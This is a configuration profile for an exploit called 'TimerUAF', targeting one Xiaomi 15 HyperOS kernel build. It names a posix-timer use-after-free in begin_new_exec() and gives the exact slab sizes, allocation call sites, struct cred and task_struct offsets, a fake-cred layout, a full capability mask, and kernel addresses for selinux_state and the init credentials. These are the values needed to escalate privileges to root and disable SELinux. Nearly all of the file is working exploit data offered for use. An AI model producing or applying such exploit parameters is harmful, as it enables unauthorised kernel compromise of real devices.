# TimerUAF kernel profile (HOCON; JSON remains valid)
# Device: Xiaomi 15 (dada / 24129PN74C)
# Build : OS4.0.0.11.XOCMIXM (HyperOS 4.0, global, Android 17)
# Kernel: 6.6.118-android15-8-g0908354dac1b-ab16143355-4k (4K pages)
#
# Every constant below is derived from that factory boot.img's
# vmlinux+BTF (nm/llvm-objdump/bpftool); this is a different binary from the
# OS3.0.307.0.WOCCNXM 6.6.118-android15-8-gc44b714366cc-abogki519650608-4k
# profile, so all offsets and addresses were re-derived independently.
#   boot.img     sha256 3e8f0134cb685336a4a9b84916036beb48cbee9b2310776c0406278bce83c9e8
#   kernel(Image) sha256 1073400e04a4cf94871b40a230b42af0078ff3f07aa6a52bff0469f0c127195b
#   vmlinux symbols: 110201
#
#   init_posix_timers: kmem_cache_create("posix_timers_cache", 0x108, 0,
#                      SLAB_PANIC|SLAB_ACCOUNT)  -> timer_alloc 0x108
#   do_timer_create:   bl kmem_cache_alloc at 0xffffffc080195d4c, returns to
#                      0xffffffc080195d50 (x0 = posix_timers_cache)
#   copy_process:      bl kmem_cache_alloc_node at 0xffffffc0800ab938,
#                      returns to 0xffffffc0800ab93c (x0 = task_struct_cachep)
#                      -> low21 0xab93c
#   BTF:               cred 0xb8 (uid 0x8, euid 0x18, caps 0x30,
#                      security 0x80, user 0x88, user_ns 0x90,
#                      ucounts 0x98, group_info 0xa0)
#                      task_struct 0x12c0 (cred 0x820, real_cred 0x818)
#                      k_itimer 0x108 (it 0x78)
#   vendor_boot cmdline: android_arch_task_struct_size=512 (0x200).
#                      task_struct_vendor_size_setup() clamps to <=0x400 and
#                      adds to the 0x12c0 base -> arch_task_struct_size
#                      0x12c0 + 0x200 = 0x14c0 (task_alloc_bytes).
#   LSM blob order:    capability, selinux, bpf, integrity ->
#                      selinux cred blob offset stays 0.
#
# Vulnerability: fs/exec.c begin_new_exec() still calls
# posix_cpu_timers_exit() before exit_itimers().
release = "6.6.118-android15-8-g0908354dac1b-ab16143355-4k"
schema_version = 1
ksu_kmi = "android15-6.6"

page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# do_timer_create -> kmem_cache_alloc(posix_timers_cache)
timer_site = 0xffffffc080195d50
timer_alloc = 0x108
# The `it` union (k_itimer.it) is at +0x78; its `cpu` member is a
# struct cpu_timer, whose first field `node` is at +0, so the timerqueue
# rb_node sits at +0x78.
timer_node_off = 0x78

# cred_jar: sizeof(struct cred)=0xb8 (BTF), SLAB_HWCACHE_ALIGN -> 0xc0
cred_req = 0xb8
cred_alloc = 0xc0
cred_size = 0xb8
cred_uid_off = 0x8
cred_euid_off = 0x18
cred_cap_off = 0x30
cred_cap_count = 5
cred_security_off = 0x80
cred_user_off = 0x88
cred_userns_off = 0x90
cred_ucounts_off = 0x98
cred_group_off = 0xa0
fake_cred_off = 0x18

# link-time symbols (kallsyms)
selinux_state = 0xffffffc08236a2e0
panic_on_warn = 0xffffffc08211ae0c

# task_struct / cred layout (BTF)
task_cred_off = 0x820
copy_process_low21 = 0xab93c
# 0x12c0 (BTF sizeof task_struct) + 0x200 (bootconfig vendor extension)
task_alloc_bytes = 0x14c0

# capability and fake-cred refcounted sub-objects
fullcap = 0x1ffffffffff
root_user = 0xffffffc08213f1e0
init_user_ns = 0xffffffc08213ef50
init_ucounts = 0xffffffc082140cb0
init_groups = 0xffffffc082140740

# task_security_struct
# Effective LSM cred-blob order is capability, selinux, bpf, integrity;
# capability contributes no cred blob here, so selinux is first at offset 0.
selinux_blob_off = 0x0
selinux_sid_kernel = 1
